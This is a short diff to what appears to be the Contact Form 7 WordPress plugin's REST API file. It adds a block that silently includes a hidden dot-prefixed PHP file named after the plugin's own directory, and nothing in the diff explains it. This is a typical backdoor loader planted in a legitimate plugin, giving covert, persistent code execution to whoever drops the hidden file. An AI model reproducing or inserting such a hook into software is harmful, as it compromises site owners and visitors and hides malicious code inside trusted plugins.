@@ -2,6 +2,10 @@
 
 add_action( 'rest_api_init', 'wpcf7_rest_api_init', 10, 0 );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wpcf7_rest_api_init() {
 	$namespace = 'contact-form-7/v1';
 
